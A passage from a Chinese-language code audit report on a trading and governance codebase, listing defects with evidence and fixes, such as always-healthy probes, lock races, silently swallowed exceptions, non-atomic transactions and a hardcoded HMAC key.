- **问题**：log-nothing-and-continue——监控器自身故障时完全无声
- **影响**：运维无法得知监控已失效——"监控监控器"的盲点
- **修复**：至少logger.warning，连续失败N次后告警

#### 5.53.7 [HIGH] ERROR级别记录后不采取行动（log-and-continue反模式）
- **文件**：[alert_handler.py](file:///D:/ZephyrAlpha/src/zephyr/trading/orchestrator/alert_handler.py#L58)
- **证据**：`except Exception as exc: logger.error(...); return None`——告警处理失败后return None，调用方无法区分"无告警"和"处理异常"
- **问题**：告警丢失后无声返回None
- **修复**：re-raise或返回Result类型区分Ok/Err

#### 5.53.8 严重度汇总

| 严重度 | 数量 | 编号 |
|---|:---:|---|
| CRITICAL/HIGH | 2 | 5.53.6/5.53.7 |
| MEDIUM | 5 | 5.53.1~5.53.5 |
| **合计** | **7** | |

---

### 5.54 配置热重载（5个，第14轮新增）

> 维度说明：运行时配置变更是否生效、缓存引用刷新、回调失败处理等。

#### 5.54.1 [MEDIUM] LLM Provider配置在模块导入时冻结，运行时不刷新（3处副本）
- **文件**：[llm_gateway.py](file:///D:/ZephyrAlpha/src/zephyr/integration/llm_gateway.py#L142)
- **证据**：`_PROVIDERS`模块级全局，base_url/default_model在import时通过os.getenv读取一次后冻结；但api_key在每次调用时动态读取——缓存策略不一致
- **问题**：运维修改DEEPSEEK_BASE_URL后运行中进程仍用旧URL（除非重启）
- **修复**：改为延迟读取或提供reload_providers()接口

#### 5.54.2 [MEDIUM] EnvWatcher仅写sentinel文件，不更新运行中进程的os.environ
- **文件**：[env_watcher.py](file:///D:/ZephyrAlpha/src/zephyr/governance/env_watcher.py#L51)
- **证据**：check_for_changes检测.env变更后仅写sentinel JSON并返回"需要重载"提示，不实际调用os.environ.update()
- **问题**：.env修改后os.getenv()读取的配置在当前进程内仍是旧值
- **修复**：检测到变更时同步执行os.environ.update()

#### 5.54.3 [MEDIUM] reload_config重载后不通知持有旧引用的消费者
- **文件**：[config/__init__.py](file:///D:/ZephyrAlpha/src/zephyr/infrastructure/config/__init__.py#L154)
- **证据**：AppConfig是frozen=True（不可变）；reload_config返回全新实例，但__init__时缓存self._config的消费者不收到新实例
- **问题**：调用reload_config()后系统内配置不一致
- **修复**：引入配置中心模式（ConfigHolder + 回调通知）

#### 5.54.4 [MEDIUM] 配置热重载回调失败被静默吞没
- **文件**：[config_reload_semantic.py](file:///D:/ZephyrAlpha/src/zephyr/infrastructure/capacity_assurance/modules/config_reload_semantic.py#L44)
- **证据**：`reloaded.append(filepath)`在回调执行之前；回调抛异常被`except Exception: pass`吞掉，文件仍被报告为"已重载"
- **问题**：组件实际未用新配置，但报告显示已重载——运维误判
- **修复**：回调失败时logger.warning并从reloaded列表移除

#### 5.54.5 [MEDIUM] ResourceOptimizationEngine配置重载OSError被静默
- **文件**：[resource_optimization.py](file:///D:/ZephyrAlpha/src/zephyr/trading/resource_optimization.py#L796)
- **证据**：`except OSError: pass`——配置文件被删除/权限丢失时静默停止热重载
- **问题**：配置文件误删后引擎静默停止热重载
- **修复**：logger.warning并触发告警

#### 5.54.6 严重度汇总

| 严重度 | 数量 | 编号 |
|---|:---:|---|
| CRITICAL/HIGH | 0 | |
| MEDIUM | 5 | 5.54.1~5.54.5 |
| **合计** | **5** | |

---

### 5.55 健康检查深度（6个，第14轮新增）

> 维度说明：liveness/readiness探针真实性、依赖检查、健康检查副作用等。

#### 5.55.1 [HIGH] Readiness探针不检查真实依赖，默认deps_ok=True
- **文件**：[health_probes.py](file:///D:/ZephyrAlpha/src/zephyr/infrastructure/system_telemetry/health_probes.py#L92)
- **证据**：`def readiness(self, system, deps_ok=True)`——deps_ok是调用方传入的布尔值，不是探针自己探测的结果；调用方不传则永远返回ready
- **问题**：DB宕机时readiness仍返回ready
- **修复**：探针内部实际执行依赖探测（SELECT 1 for DB）

#### 5.55.2 [HIGH] HealthAggregator.poll_all调用readiness不传依赖状态
- **文件**：[health_aggregator.py](file:///D:/ZephyrAlpha/src/zephyr/infrastructure/system_telemetry/health_aggregator.py#L56)
- **证据**：`readiness = self._probes.readiness(system)`——未传deps_ok，恒为True，12个系统readiness永远全绿
- **问题**：健康面板readiness数据完全失真
- **修复**：为每个system查询真实依赖状态后传入

#### 5.55.3 [HIGH] 健康探针注册为"假"探针——永远返回alive=True
- **文件**：[health_monitor.py](file:///D:/ZephyrAlpha/src/zephyr/trading/health_monitor.py#L117)
- **证据**：`_longevity_probe`的try块内只有`return ProbeResult(alive=True, ready=True)`，无任何实际检查；except分支因try内无可抛异常代码而永远不可达
- **问题**：reconcile()基于"假alive=True"判定组件active，从不触发auto_restart
- **修复**：probe函数内实际调用_longevity.check()

#### 5.55.4 [HIGH] VerdictEngine.health_check永远返回"healthy"
- **文件**：[verdict_engine.py](file:///D:/ZephyrAlpha/src/zephyr/trading/verdict_engine.py#L403)
- **证据**：`return {"status": "healthy", ...}`——status硬编码，无基于red_rate的降级判定
- **问题**：裁决引擎大量拒绝操作时健康检查仍报健康
- **修复**：根据red_rate阈值返回degraded/unhealthy

#### 5.55.5 [MEDIUM] Liveness探针返回硬编码pid=0
- **文件**：[health_probes.py](file:///D:/ZephyrAlpha/src/zephyr/infrastructure/system_telemetry/health_probes.py#L84)
- **证据**：`"pid": 0`——硬编码，非os.getpid()；status永远"alive"，无存活检测逻辑
- **问题**：进程假死时liveness仍返回alive
- **修复**：pid=os.getpid()；status基于心跳时间戳判断

#### 5.55.6 [MEDIUM] BlueprintHealthChecker是空壳，永远返回healthy
- **文件**：[blueprint_health.py](file:///D:/ZephyrAlpha/src/zephyr/trading/orchestrator/blueprint_health.py#L21)
- **证据**：`def check_consistency(self, blueprint_file): return {"status": "healthy", "errors": []}`——空壳不做任何检查
- **问题**：蓝图字段缺失或引用断裂时不会被发现
- **修复**：实现真实检查逻辑

#### 5.55.7 严重度汇总

| 严重度 | 数量 | 编号 |
|---|:---:|---|
| CRITICAL/HIGH | 4 | 5.55.1/5.55.2/5.55.3/5.55.4 |
| MEDIUM | 2 | 5.55.5/5.55.6 |
| **合计** | **6** | |

---

### 5.56 协议合规性（5个，第14轮新增）

> 维度说明：HTTP状态码正确性、JSON-RPC规范、错误码语义、事件丢弃语义等。

#### 5.56.1 [MEDIUM] HTTP状态码判定过窄——只接受200，拒绝其他2xx
- **文件**：[gpu_consensus_scheduler.py](file:///D:/ZephyrAlpha/src/zephyr/governance/behavioral_admission/gpu_consensus_scheduler.py#L444), [auto_runtime_core.py](file:///D:/ZephyrAlpha/src/zephyr/trading/auto_runtime_core.py#L206)
- **证据**：`if resp.status_code == 200:`——非`200 <= status_code < 300`，将201/202/204误判为失败
- **问题**：Ollama API升级返回201/202时推理调用静默失败
- **修复**：统一用resp.raise_for_status()或范围判定

#### 5.56.2 [MEDIUM] JSON-RPC响应id为null，违反JSON-RPC 2.0规范
- **文件**：[gateway_server.py](file:///D:/ZephyrAlpha/src/zephyr/infrastructure/gateway_server.py#L682)
- **证据**：`return self._err(None, ERR_RBAC_DENIED, ...)`——req_id传None；safety_level=M时`"id": None`硬编码
- **问题**：客户端无法将安全拦截响应与原始请求关联
- **修复**：将None替换为实际req_id

#### 5.56.3 [MEDIUM] 错误码语义不匹配——用RBAC拒绝码表示安全审批要求
- **文件**：[gateway_server.py](file:///D:/ZephyrAlpha/src/zephyr/infrastructure/gateway_server.py#L684), [error_codes.py](file:///D:/ZephyrAlpha/src/zephyr/infrastructure/error_codes.py#L33)
- **证据**：safety_level=H（需Owner审批）使用ERR_RBAC_DENIED（-32004，RBAC权限拒绝）——两者语义完全不同
- **问题**：客户端无法区分"用户无权限"与"操作需审批"
- **修复**：新增ERR_SAFETY_APPROVAL_REQUIRED错误码

#### 5.56.4 [MEDIUM] 事件队列满时静默丢弃，调用方无法区分成功与丢弃
- **文件**：[event_bus.py](file:///D:/ZephyrAlpha/src/zephyr/shared/event_bus.py#L241)
- **证据**：`if queue_depth >= self.max_queue_size: self._dropped_count += 1; return False`——返回False但调用方很少检查
- **问题**：关键业务事件可能在背压时被丢弃，下游永远收不到
- **修复**：事件丢弃时记录WARNING日志；HIGH优先级事件永不丢弃

#### 5.56.5 [LOW] Self类型注解未导入且语义错误
- **文件**：[outbox.py](file:///D:/ZephyrAlpha/src/zephyr/shared/infra/outbox.py#L95)
- **证据**：`async def append(...) -> Self:`——Self未从typing导入；方法实际返回OutboxEntry不是Self
- **问题**：typing.get_type_hints()会抛NameError；类型检查器报错
- **修复**：导入Self并修正返回类型为OutboxEntry

#### 5.56.6 严重度汇总

| 严重度 | 数量 | 编号 |
|---|:---:|---|
| CRITICAL/HIGH | 0 | |
| MEDIUM | 4 | 5.56.1~5.56.4 |
| LOW | 1 | 5.56.5 |
| **合计** | **5** | |

---

### 5.57 事件排序与因果一致性（7个，第14轮新增）

> 维度说明：事件序列号、因果链、事件重放、DLQ集成等。（注：HookDispatcher._call_webhook为pass已在5.40.5记录，此处不重复）

#### 5.57.1 [MEDIUM] 事件ID使用秒级时间戳，同一秒内碰撞
- **文件**：[event_bus.py](file:///D:/ZephyrAlpha/src/zephyr/shared/event_bus.py#L110)
- **证据**：`event_id=f"EV-{task_id}-{datetime.now(UTC).strftime('%Y%m%d-%H%M%S')}"`——秒级精度，同task同秒碰撞
- **问题**：event_id不唯一；消费者用event_id做幂等去重时第二个事件被误判为重复
- **修复**：使用uuid4或追加单调递增序号

#### 5.57.2 [MEDIUM] 无单调序列号，消费者无法检测乱序
- **文件**：[event_bus.py](file:///D:/ZephyrAlpha/src/zephyr/shared/event_bus.py#L108), [event_store.py](file:///D:/ZephyrAlpha/src/zephyr/governance/event_store.py#L162)
- **证据**：所有事件存储按timestamp排序，无单调递增整数sequence；多线程并发写入时时间戳可能相同或倒序
- **问题**：事件回放时因果顺序可能错误
- **修复**：增加seq INTEGER AUTOINCREMENT列，ORDER BY seq ASC

#### 5.57.3 [HIGH] 事件处理异常被静默吞没，因果链断裂
- **文件**：[event_bus.py](file:///D:/ZephyrAlpha/src/zephyr/shared/event_bus.py#L119), [observer.py](file:///D:/ZephyrAlpha/src/zephyr/shared/infra/observer.py#L92)
- **证据**：`for handler in handlers: try: handler(event) except Exception: pass`——所有异常被pass吞没
- **问题**：handler失败后事件被认为"已处理"但副作用未生效，下游事件依赖的修改不存在
- **修复**：handler异常应记录日志并写入DLQ

#### 5.57.4 [HIGH] DLQ的attach()方法是空操作，不实际捕获失败事件
- **文件**：[dlq.py](file:///D:/ZephyrAlpha/src/zephyr/shared/events/dlq.py#L145)
- **证据**：`_failure_handler`抛RuntimeError后立即自己catch并pass，等于永远成功；不会捕获其他handler的失败
- **问题**：误用attach()的用户以为有DLQ保护，实际没有任何失败捕获
- **修复**：删除attach()或委托给attach_dlq_to_observer()

#### 5.57.5 [MEDIUM] DLQ重试无幂等性保证，可能导致副作用重复
- **文件**：[dlq.py](file:///D:/ZephyrAlpha/src/zephyr/shared/events/dlq.py#L210)
- **证据**：DeadLetter数据结构无idempotency_key字段；pop_retryable取出死信后重新emit，无去重机制
- **问题**：非幂等handler处理同一死信两次会产生重复副作用（重复创建订单等）
- **修复**：DeadLetter增加idempotency_key字段

#### 5.57.6 [HIGH] 事件完整性校验链是空操作——永远通过
- **文件**：[event_store.py](file:///D:/ZephyrAlpha/src/zephyr/governance/event_store.py#L215)
- **证据**：verify_integrity比较prev_hash（前一条事件hash）与expected_prev（重新计算的前一条事件hash）——同一份数据的同一hash，结构上不可能失败
- **问题**：篡改payload、删除事件、重排序都无法被检测到
- **修复**：append_event时将前一条hash存入当前事件记录，校验时比较存储的prev_hash

#### 5.57.7 [MEDIUM] Outbox的fetch_pending无锁保护，与append竞态
- **文件**：[outbox.py](file:///D:/ZephyrAlpha/src/zephyr/shared/infra/outbox.py#L134)
- **证据**：append有`async with self._lock`但fetch_pending/mark_published/mark_failed无锁
- **问题**：并发时`RuntimeError: dictionary changed size during iteration`
- **修复**：所有读写self._entries的方法都加锁

#### 5.57.8 严重度汇总

| 严重度 | 数量 | 编号 |
|---|:---:|---|
| CRITICAL/HIGH | 3 | 5.57.3/5.57.4/5.57.6 |
| MEDIUM | 4 | 5.57.1/5.57.2/5.57.5/5.57.7 |
| **合计** | **7** | |

---

### 5.58 分布式锁正确性（10个，第14轮新增）

> 维度说明：锁fencing token、自动续期、持有者验证、TOCTOU竞态、可重入性等。（注：MemoryLock TTL参数被忽略已在5.40.9记录，此处不重复）

#### 5.58.1 [HIGH] _CrossProcessLock释放时不验证当前持有者，可删除他人的锁
- **文件**：[staging_area.py](file:///D:/ZephyrAlpha/src/zephyr/trading/staging_area.py#L155)
- **证据**：`__exit__`中`os.remove(self._lock_file)`只检查self._acquired，不检查锁文件内容是否仍属于当前进程
- **问题**：锁TTL过期后被另一进程抢占，当前进程__exit__会删除新持有者的锁文件
- **修复**：释放前读取锁文件验证pid/owner_id一致

#### 5.58.2 [HIGH] 所有跨进程锁均无fencing token（4处）
- **文件**：[staging_area.py](file:///D:/ZephyrAlpha/src/zephyr/trading/staging_area.py#L120), [pipeline_lock.py](file:///D:/ZephyrAlpha/src/zephyr/integration/pipeline_lock.py#L227), [rollback_lock.py](file:///D:/ZephyrAlpha/src/zephyr/governance/rollback_lock.py#L129), [scan_mutex.py](file:///D:/ZephyrAlpha/src/zephyr/governance/drift_detection/scan_mutex.py#L183)
- **证据**：所有4个锁实现锁文件中只存储pid/timestamp/task_id，无单调递增fencing token
- **问题**：TTL过期后"僵尸"进程继续修改共享资源，与新锁持有者并发写入
- **修复**：锁文件存储单调递增fencing_token，受保护操作执行前验证

#### 5.58.3 [HIGH] 所有锁均无自动续期，长时间操作会丢失锁（4处）
- **文件**：[staging_area.py](file:///D:/ZephyrAlpha/src/zephyr/trading/staging_area.py#L103) (TTL=1800s), [pipeline_lock.py](file:///D:/ZephyrAlpha/src/zephyr/integration/pipeline_lock.py#L203) (TTL=300s), [rollback_lock.py](file:///D:/ZephyrAlpha/src/zephyr/governance/rollback_lock.py#L90) (TTL=60s), [scan_mutex.py](file:///D:/ZephyrAlpha/src/zephyr/governance/drift_detection/scan_mutex.py#L57) (TTL=120s)
- **证据**：4个锁都有TTL但无watchdog/自动续期机制；shared/infra/lock.py docstring声称"TTL+自动续期"但未实现
- **问题**：大文件提交/深度扫描/多步回滚超过TTL后锁被抢占
- **修复**：实现watchdog协程定期刷新锁文件acquired_at

#### 5.58.4 [HIGH] ScanMutex的_write_lock用os.replace覆盖其他进程的锁
- **文件**：[scan_mutex.py](file:///D:/ZephyrAlpha/src/zephyr/governance/drift_detection/scan_mutex.py#L195)
- **证据**：`os.replace(tmp_path, self._lock_path)`——无条件覆盖目标文件，不检查存在性；对比staging_area用O_CREAT|O_EXCL原子创建
- **问题**：进程A检查is_locked()=False → 进程B创建锁 → 进程A的os.replace覆盖B的锁——两个进程都认为自己持有锁
- **修复**：改为os.open(O_CREAT|O_EXCL)原子创建

#### 5.58.5 [HIGH] ScanMutex强制释放DEEP扫描的锁——LIGHT扫描抢占
- **文件**：[scan_mutex.py](file:///D:/ZephyrAlpha/src/zephyr/governance/drift_detection/scan_mutex.py#L172)
- **证据**：`elif level == ScanLevel.LIGHT and lock.scan_level == ScanLevel.DEEP: self.force_release()`——LIGHT扫描碰撞DEEP扫描时直接删除DEEP锁
- **问题**：DEEP扫描持有者不知锁被释放，仍在执行；LIGHT扫描获取锁后并发执行
- **修复**：LIGHT扫描应排队等待DEEP完成

#### 5.58.6 [HIGH] RollbackLock的TOCTOU竞态——os.remove后os.open之间可被抢占
- **文件**：[rollback_lock.py](file:///D:/ZephyrAlpha/src/zephyr/governance/rollback_lock.py#L167)
- **证据**：`os.remove(str(self._lock_path)); fd = os.open(..., O_CREAT|O_EXCL, ...)`——两步非原子
- **问题**：remove后open前被其他进程抢占
- **修复**：直接os.open(O_CREAT|O_EXCL)尝试，失败再检查stale

#### 5.58.7 [HIGH] RollbackLock的release()空lock_id释放任意锁
- **文件**：[rollback_lock.py](file:///D:/ZephyrAlpha/src/zephyr/governance/rollback_lock.py#L205)
- **证据**：`def release(self, lock_id: str = "")`——lock_id默认空字符串，空时跳过持有者验证直接删除锁文件
- **问题**：任何调用release()不传参的代码都会释放当前锁
- **修复**：lock_id应为必填参数

#### 5.58.8 [MEDIUM] RollbackLock的_dequeue_request未实际移除指定条目
- **文件**：[rollback_lock.py](file:///D:/ZephyrAlpha/src/zephyr/governance/rollback_lock.py#L336)
- **证据**：`def _dequeue_request(self, lock_id): self._cleanup_stale_queue_entries()`——只清理过期条目，不使用lock_id参数
- **问题**：队列文件不断增长；基于队列长度的调度决策误判系统负载
- **修复**：实现真正的dequeue——过滤掉指定lock_id的条目

#### 5.58.9 [MEDIUM] FileLockBackend多文件锁定非原子，部分失败导致锁泄漏
- **文件**：[pipeline_lock.py](file:///D:/ZephyrAlpha/src/zephyr/integration/pipeline_lock.py#L296)
- **证据**：遍历all_targets逐个创建锁目录，第3个冲突时前2个锁不回滚；返回CONFLICT但不释放已获取的锁
- **问题**：孤儿锁阻止其他任务获取这些文件的锁直到TTL过期
- **修复**：冲突时回滚已获取的锁（两阶段锁定）

#### 5.58.10 [MEDIUM] MemoryLock的release不验证owner_id
- **文件**：[lock.py](file:///D:/ZephyrAlpha/src/zephyr/shared/infra/lock.py#L142)
- **证据**：`async def release(self, handle)`——只检查lock存在且被持有，不验证handle.owner_id是否匹配self._owners中记录的持有者
- **问题**：任何拿到LockHandle引用的代码都能释放他人的锁
- **修复**：增加`if self._owners.get(handle.lock_name) != handle.owner_id: return False`

#### 5.58.11 严重度汇总

| 严重度 | 数量 | 编号 |
|---|:---:|---|
| CRITICAL/HIGH | 7 | 5.58.1~5.58.7 |
| MEDIUM | 3 | 5.58.8/5.58.9/5.58.10 |
| **合计** | **10** | |

---

### 5.59 编码与字符集（5个，第14轮新增）

> 维度说明：BOM处理、编码回退链、errors策略一致性等。

#### 5.59.1 [HIGH] CSV读取未处理UTF-8 BOM，首列名被污染导致静默数据丢失
- **文件**：[registry_adapter.py](file:///D:/ZephyrAlpha/src/zephyr/infrastructure/asset_inventory/registry_adapter.py#L669)
- **证据**：`raw = file_path.read_text(encoding="utf-8")`——utf-8不剥离BOM；若CSV由Excel生成带BOM，csv.DictReader把首列名读成`\ufeffpath`而非`path`
- **问题**：row.get("path", "")对所有行返回空字符串，所有资产条目被静默丢弃
- **修复**：改为encoding="utf-8-sig"

#### 5.59.2 [HIGH] 多编码回退链（utf-8→gbk→latin-1）静默误判文件编码
- **文件**：[skill_discovery.py](file:///D:/ZephyrAlpha/src/zephyr/autonomy_core/skill_discovery.py#L109)
- **证据**：三层try/except回退：utf-8→gbk→latin-1；latin-1永不抛UnicodeDecodeError，等于"无论文件是什么都强行解码"
- **问题**：二进制文件或错误编码文件被解码成乱码，继续做模块名提取产生幻觉数据
- **修复**：统一用utf-8+strict，非UTF-8文件应记录错误并跳过

#### 5.59.3 [MEDIUM] errors="ignore"静默丢弃字节，行数统计失真
- **文件**：[metadata.py](file:///D:/ZephyrAlpha/src/zephyr/infrastructure/asset_inventory/metadata.py#L178), [capability_lookup.py](file:///D:/ZephyrAlpha/src/zephyr/governance/capability_lookup.py#L514)
- **证据**：`full.read_text(encoding="utf-8", errors="ignore")`——非法字节被直接丢弃
- **问题**：行数统计和import计数失真，影响架构决策数据
- **修复**：改用errors="replace"或二进制模式按b"\n"计数

#### 5.59.4 [MEDIUM] errors="replace"用于路径提取，可能产生幻觉路径
- **文件**：[reconciliation_registry.py](file:///D:/ZephyrAlpha/src/zephyr/governance/reconciliation_registry.py#L1017)
- **证据**：`content = doc.read_text(encoding="utf-8", errors="replace")`——替换字符\ufffd可能出现在路径中间
- **问题**：产生形如`docs/\ufffd03_modules/foo.md`的幻觉路径，污染对账结果
- **修复**：先校验文件是否合法UTF-8，校验失败则记录并跳过

#### 5.59.5 [LOW] subprocess输出解码策略不一致
- **文件**：[reconciliation_registry.py](file:///D:/ZephyrAlpha/src/zephyr/governance/reconciliation_registry.py#L263)
- **证据**：此处用errors="replace"，其他多数subprocess调用未指定errors（默认strict）——策略不一致
- **问题**：部分调用遇非UTF-8输出崩溃，另一部分静默替换
- **修复**：封装统一的run_subprocess()工具函数

#### 5.59.6 严重度汇总

| 严重度 | 数量 | 编号 |
|---|:---:|---|
| CRITICAL/HIGH | 2 | 5.59.1/5.59.2 |
| MEDIUM | 2 | 5.59.3/5.59.4 |
| LOW | 1 | 5.59.5 |
| **合计** | **5** | |

---

### 5.60 模块耦合度深度（9个，第14轮新增）

> 维度说明：循环依赖、跨层引用、API边界模糊、re-export壳等架构级耦合问题。

#### 5.60.1 [HIGH] 循环依赖——governance ↔ trading（双向导入）
- **文件**：[broker_interface.py](file:///D:/ZephyrAlpha/src/zephyr/governance/broker_interface.py#L40) (governance→trading), [trading_contracts/__init__.py](file:///D:/ZephyrAlpha/src/zephyr/trading/trading_contracts/__init__.py#L20) (trading→governance)
- **证据**：governance导入trading的Fill/Order/PositionSnapshot；trading_contracts导入governance的ComplianceRule/PerformanceAttributionReport——双向循环
- **问题**：import顺序敏感；trading_contracts不再是纯数据契约包（违反自身不变量声明）
- **修复**：将ComplianceRule等从trading_contracts导出中移除

#### 5.60.2 [MEDIUM] 循环依赖——governance → trading.orchestrator（延迟导入）
- **文件**：[phase_check_registry.py](file:///D:/ZephyrAlpha/src/zephyr/governance/phase_check_registry.py#L329)
- **证据**：函数内`from zephyr.trading.orchestrator.contract_registry import ContractRegistry`等——延迟导入规避import时循环但运行时耦合存在
- **问题**：governance门禁检查依赖trading.orchestrator具体实现，无法独立测试
- **修复**：定义抽象接口（Protocol），trading.orchestrator实现该接口

#### 5.60.3 [HIGH] 跨层引用——shared(L1) → trading(L2)，违反分层架构
- **文件**：[order.py](file:///D:/ZephyrAlpha/src/zephyr/shared/contracts/order.py#L8), [enforcer.py](file:///D:/ZephyrAlpha/src/zephyr/shared/contracts/core/enforcer.py#L41)
- **证据**：`from zephyr.trading.trading_contracts.execution.order import OrderSide`——基础层导入领域层（逆向依赖）；同目录orchestration_protocol.py注释明确写着"MUST NOT import from zephyr.trading"
- **问题**：shared层无法独立编译/测试
- **修复**：OrderSide等定义下沉到shared，trading层从shared导入

#### 5.60.4 [MEDIUM] 跨层引用——shared(L1) → governance(L2) + ops + import *
- **文件**：[protocols.py](file:///D:/ZephyrAlpha/src/zephyr/shared/contracts/protocols.py#L31), [metrics.py](file:///D:/ZephyrAlpha/src/zephyr/shared/metrics.py#L25), [health.py](file:///D:/ZephyrAlpha/src/zephyr/shared/health.py#L25), [logging.py](file:///D:/ZephyrAlpha/src/zephyr/shared/logging.py#L25)
- **证据**：shared导入governance.rule_enforcement.gate_types；shared/metrics.py等用`from zephyr.ops.observability.* import *`——shared成为ops的透传层
- **问题**：shared不再是稳定基础层；import *导致命名空间污染
- **修复**：GateResult下沉到shared；移除import *改为显式导入

#### 5.60.5 [HIGH] 跨层引用——infrastructure(L0) → governance(L2)，L0依赖L2
- **文件**：[audit_logger.py](file:///D:/ZephyrAlpha/src/zephyr/infrastructure/audit_logger.py#L42), [governance_server.py](file:///D:/ZephyrAlpha/src/zephyr/infrastructure/governance_server.py#L716)
- **证据**：infrastructure层导入governance.audit_trail.writer.AuditWriter；governance_server.py有9处延迟导入governance具体类
- **问题**：L0基础设施层依赖L2领域层是严重分层违规
- **修复**：定义抽象接口或考虑将governance_server.py移到governance层

#### 5.60.6 [HIGH] 跨域直接依赖具体实现——ex_core → governance（BrokerInterface定义在错误的层）
- **文件**：[order_manager.py](file:///D:/ZephyrAlpha/src/zephyr/ex_core/order_manager.py#L47)
- **证据**：`from zephyr.governance.broker_interface import BrokerInterface`——执行核心的端口定义在治理层，违反DIP
- **问题**：ex_core无法脱离governance独立复用
- **修复**：BrokerInterface移到ex_core或shared.contracts

#### 5.60.7 [MEDIUM] API三重导出——trading_contracts在三个包重复暴露
- **文件**：[trading/trading_contracts/__init__.py](file:///D:/ZephyrAlpha/src/zephyr/trading/trading_contracts/__init__.py), [governance/trading_contracts/__init__.py](file:///D:/ZephyrAlpha/src/zephyr/governance/trading_contracts/__init__.py), [ex_core/adapters/__init__.py](file:///D:/ZephyrAlpha/src/zephyr/ex_core/adapters/__init__.py#L5)
- **证据**：governance/trading_contracts/__init__.py前25行与trading/trading_contracts/__init__.py完全一致（相同import/docstring/module_id）
- **问题**：消费者不知道从哪导入；修改后副本可能不同步
- **修复**：删除governance/trading_contracts/目录

#### 5.60.8 [MEDIUM] compliance包整体为governance的re-export壳（15个模块import *）
- **文件**：[compliance/](file:///D:/ZephyrAlpha/src/zephyr/compliance/) 下15个文件
- **证据**：`from zephyr.governance.integrity import *`等15处——整个包是governance的空壳镜像；docstring承认"已迁移到governance"但同时标记[STABILITY] frozen——矛盾
- **问题**：同一套API在两个包下暴露；消费者不知该用compliance.X还是governance.X
- **修复**：制定deprecation计划，最终删除compliance包

#### 5.60.9 [LOW] __all__导出过载——audit_orchestrator导出83项
- **文件**：[audit_orchestrator/__init__.py](file:///D:/ZephyrAlpha/src/zephyr/governance/audit_orchestrator/__init__.py#L70)
- **证据**：__all__列表83个条目，混合类名（52项）和子模块名（31项）
- **问题**：公开API边界完全失控；from ... import *会污染命名空间
- **修复**：精简到核心facade类（<10项）

#### 5.60.10 严重度汇总

| 严重度 | 数量 | 编号 |
|---|:---:|---|
| CRITICAL/HIGH | 4 | 5.60.1/5.60.3/5.60.5/5.60.6 |
| MEDIUM | 4 | 5.60.2/5.60.4/5.60.7/5.60.8 |
| LOW | 1 | 5.60.9 |
| **合计** | **9** | |

---

### 5.61 事务隔离与ACID合规性（7个，第15轮新增）

#### 5.61.1 [HIGH] batch_review 7维度审查非原子性——部分提交导致状态不一致

- **文件**：`src/zephyr/governance/task_repo.py:1861-1900`
- **证据**：`batch_review` 在 `for dim in self._BATCH_REVIEW_DIMENSIONS:` 循环内，每个维度各自开启独立事务（L1891 `with self._write_tx() as conn:`），7个维度的 INSERT 各自提交。前3个维度成功后第4个维度抛异常时，已提交的3条记录无法回滚，审查结果处于"部分完成"中间态，违反ACID原子性。
- **修复**：将整个7维度批次审查包裹在单一事务中。

#### 5.61.2 [HIGH] PostgreSQL连接默认autocommit=True——多语句写操作无原子性保证

- **文件**：`src/zephyr/governance/depgraph_schema.py:1186,1196-1197`；调用方 `database_service.py:88`、`depgraph_reader.py:81`
- **证据**：`get_depgraph_pg_connection` 默认 `autocommit=True`（L1197）。`DatabaseService.get_depgraph_conn` 和 `DepgraphReader._get_conn` 均以 autocommit=True 获取连接并缓存为单一长连接。跨多条SQL的写操作每条语句独立提交，崩溃时产生不一致状态。同时未设置事务隔离级别。
- **修复**：对多语句写操作显式 `BEGIN`/`COMMIT`，设置合适隔离级别。

#### 5.61.3 [MEDIUM] retry_dlq重试计数更新在事务外执行——非原子

- **文件**：`src/zephyr/governance/database_manager.py:642-677`
- **证据**：L653 `BEGIN IMMEDIATE`，L661 `COMMIT`，异常时L665 `ROLLBACK`。但失败路径中L670-673的 retry_count 递增 UPDATE 发生在 ROLLBACK 之后、无新 BEGIN 包裹，L674的 COMMIT 实际是空操作。进程在 UPDATE 与下一轮 BEGIN 之间崩溃时，retry_count 与事件处理状态不一致。
- **修复**：将 retry_count 更新纳入独立事务。

#### 5.61.4 [MEDIUM] DatabaseManager多处连接获取后无try/finally——异常路径连接泄漏

- **文件**：`src/zephyr/governance/database_manager.py:265-301,450-466,494-496`
- **证据**：`health_check`（L265获取/L301关闭）关闭在try块内但无finally。`schema_version()`（L288）或 `_db_path.stat()`（L292）抛非sqlite3.Error异常时，控制流跳到L327 `except Exception`，该分支不关闭conn→泄漏。`_wal_checkpoint`和`maintenance`同样无try/finally。
- **修复**：所有连接获取后使用 `with` 或 try/finally 确保归还。

#### 5.61.5 [MEDIUM] 连接池get_connection/return_connection无锁保护——并发竞态

- **文件**：`src/zephyr/governance/database_manager.py:197-243`
- **证据**：`_conn_pool` 为共享list，`get_connection`（L211-216）的 `if self._conn_pool:` + `self._conn_pool.pop()` 非原子，未获取 `self._lock`。两线程可同时通过if判断、同时pop()，导致 IndexError 或获取到同一连接。池耗尽时L214无限创建临时连接且不追踪。
- **修复**：用锁保护连接池的获取/归还操作，设置max_overflow上限。

#### 5.61.6 [LOW] event_store每次操作新建连接——无连接复用且PRAGMA重复执行

- **文件**：`src/zephyr/infrastructure/event_store.py:136-181`
- **证据**：`_get_conn`（L136-140）每次调用 `sqlite3.connect` 并执行 `PRAGMA journal_mode=WAL` + `PRAGMA synchronous=NORMAL`。`record`/`record_batch`/`query`/`count` 均各自调用 `_get_conn()` 并在finally中close()。高频事件写入时每条记录都经历完整连接建立+PRAGMA开销。
- **修复**：使用连接池或持久连接复用。

#### 5.61.7 [MEDIUM] get_db_connection命名冲突——SQLite/PostgreSQL别名遮蔽

- **文件**：`src/zephyr/governance/depgraph_schema.py:1208-1210`
- **证据**：L1210 `get_db_connection = get_depgraph_pg_connection`（标记DEPRECATED但仍导出）。`sqlite_schema.py` 也导出同名 `get_db_connection`。两个模块的同名函数返回完全不同引擎的连接（SQLite vs PostgreSQL），任何错误导入路径会静默地用错误引擎操作数据库，事务语义完全不同。
- **修复**：删除DEPRECATED别名，强制使用明确命名的函数。

#### 5.61 严重度汇总

| 严重度 | 数量 | 编号 |
|---|:---:|---|
| HIGH | 2 | 5.61.1/5.61.2 |
| MEDIUM | 4 | 5.61.3/5.61.4/5.61.5/5.61.7 |
| LOW | 1 | 5.61.6 |
| **合计** | **7** | |

---

### 5.62 密钥轮换与密钥管理（7个，第15轮新增）

#### 5.62.1 [HIGH] 审计链HMAC密钥硬编码为"default-key"

- **文件**：`src/zephyr/governance/audit_trail/writer.py:119-120`
